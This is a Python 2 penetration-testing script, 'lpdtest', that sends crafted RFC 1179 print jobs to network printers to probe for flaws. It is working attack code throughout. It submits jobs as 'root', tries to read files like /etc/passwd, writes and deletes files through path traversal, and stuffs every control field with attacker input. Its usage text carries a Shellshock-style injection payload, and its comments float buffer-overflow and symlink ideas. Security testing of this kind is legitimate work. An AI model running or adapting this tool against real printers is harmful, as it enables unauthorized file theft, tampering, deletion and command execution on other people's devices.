#!/usr/bin/env python2
# -*- coding: utf-8 -*-

########################################################################
############## [ test for flaws in lpd implementations ] ###############
########################################################################

# Some notes and ideas:
#
# - the 'f' command could be omitted to save paper, based on
#   the unsafe assumption that control file is parsed anyway
#
# - some network printers completele ignore the control file
#
# - maybe have fun with the 'S' command (symbolic link data)
#
# - for buffer overflow tests, the length of the control or
#   data file can be set to a value lower that what's sent;
#   control lines containing \x00 might also be interesting
#
# - for 'get' mode, we are currently only using 'f' command;
#   other data file formats (=interpreters?) might be tried:
#   '1','2','3','4','c','d','g','k','l','n','o','r','t','v'
#
# - for 'put' mode, hostname could also be set to file name
#   (instead of leaving empty) as it is automatically added
#   to files in the spool dir by BSD 4.4 lpd); worth a shot

# python standard library
import sys, socket, argparse

# ----------------------------------------------------------------------

#
def usage():
  parser = argparse.ArgumentParser(
    description="Line Printer Daemon Protocol (RFC 1179) Test.",
    prog = "lpdtest",
    epilog='''example usage:
  lpdtest printer get /etc/passwd
  lpdtest printer put ../../etc/passwd
  lpdtest printer rm /some/file/on/printer
  lpdtest printer in '() {:;}; ping -c1 1.2.3.4'
  lpdtest printer mail lpdtest@mailhost.local''',
  formatter_class=argparse.RawDescriptionHelpFormatter)
  parser.add_argument("hostname", help="printer ip address or hostname")
  parser.add_argument('mode', choices=['get', 'put', 'rm', 'in', 'mail'],
                              help="select lpd proto security test")
  parser.add_argument('argument', help="specific to test, see examples")

  return parser.parse_args()

# ----------------------------------------------------------------------

# parse args
args = usage()      

# ----------------------------------------------------------------------

# get lpd acknowledgement
def check_acknowledgement():
  if s.recv(4096) != "\000":
	print "Negative acknowledgement"
	s.send("\001\n") # [ RFC 1179 | 6.1 01 - Abort job ]
	s.close()
	sys.exit()

# ----------------------------------------------------------------------

# connect to printer
s = socket.socket()
s.connect((args.hostname, 515))

# --------[ RFC 1179 | 5.2 02 - Receive a printer job ]-----------------

queue = "lp" # see https://www.brooksnet.com/content/faq-lpd-queue-names-network-print-servers
s.send("\002"+queue+"\n")
check_acknowledgement()

# ----------------------------------------------------------------------

ctrl = ""
data = "Print job from lpd test '" + args.mode \
     + "' and argument '" + args.argument + "'."

delname = srcfile = jobtitle = jobname = classname = mailname = None
hostname  = ""      # leave it blank by default so nothing is added
username  = "root"  # special user-name indicates a privileged user
ctrlfile = "cfA001" # default name of control file
datafile = "dfA001" # default name of data file
getname  = datafile # default name of file to print

# --------[ Test scenarios: get, put, del, in, mail ]-------------------

if args.mode == 'get':
  getname = args.argument
  data += " If you can read this, the test failed."
  print "[get] Trying to print file " + args.argument

elif args.mode == 'put':
  ctrlfile = args.argument
  datafile = args.argument
  print "[put] Trying to write to file " + args.argument

elif args.mode == 'rm':
  delname = args.argument
  print "[rm] Trying to delete file " + args.argument

elif args.mode == 'in':
  hostname = username = ctrlfile = datafile  = delname  = jobname \
           = srcfile  = jobtitle = classname = mailname = args.argument
  print "[in] Trying to send user input '" + args.argument + "'"

elif args.mode == 'mail':
  try:
    mailname = args.argument.split('@', 1)[0]
    hostname = args.argument.split('@', 1)[1]
  except Exception as e:
    print "Bad argument" + str(e)
    sys.exit()
  print "[mail] Trying to send job information to " + args.argument

# --------[ RFC 1179 | 6.2 02 - Receive control file ]------------------

if hostname:             ctrl += 'H'+ hostname+"\n" # [ RFC 1179 | 7.2 H  - Host name | max. 31 bytes ]
if username:             ctrl += 'P'+ username+"\n" # [ RFC 1179 | 7.8 P  - User identification | max. 31 bytes ]
if delname:              ctrl += 'U'+  delname+"\n" # [ RFC 1179 | 7.11 U - Unlink data file | max. 131 bytes ]
if mailname:             ctrl += 'M'+ mailname+"\n" # [ RFC 1179 | 7.6 M  - Mail When Printed | max. 31 bytes ]
if jobname:              ctrl += 'J'+  jobname+"\n" # [ RFC 1179 | 7.4 J  - Job name for banner page | max. 99 bytes ]
if classname:            ctrl += 'C'+classname+"\n" # [ RFC 1179 | 7.1 C  - Class for banner page | max. 31 bytes ]
if jobname or classname: ctrl += 'L'+ username+"\n" # [ RFC 1179 | 7.5 L  - Print banner page | max. 31 bytes ]
if jobtitle:             ctrl += 'T'+ jobtitle+"\n" # [ RFC 1179 | 7.10 T - Title for pr | max. 79 bytes ]
if srcfile:              ctrl += 'N'+  srcfile+"\n" # [ RFC 1179 | 7.7 N  - Name of source file | max. 131 bytes ]
if jobtitle or srcfile:  ctrl += 'p'+  srcfile+"\n" # [ RFC 1179 | 7.25 p - Print file with 'pr' format | max. 131 bytes ]
if getname:              ctrl += 'f'+  getname+"\n" # [ RFC 1179 | 7.22 l - Print file leaving control characters | max. 131 bytes ]

s.send("\002"+str(len(ctrl))+" "+ctrlfile+"\n")
check_acknowledgement()
s.send(ctrl + "\000") # send control file || file complete indicator
check_acknowledgement()

# --------[ RFC 1179 | 6.3 03 - Receive data file ]---------------------

s.send("\003"+str(len(data))+" "+datafile+"\n")
check_acknowledgement()
s.send(data + "\000") # send data file || file complete indicator
check_acknowledgement()

# ----------------------------------------------------------------------

s.close()
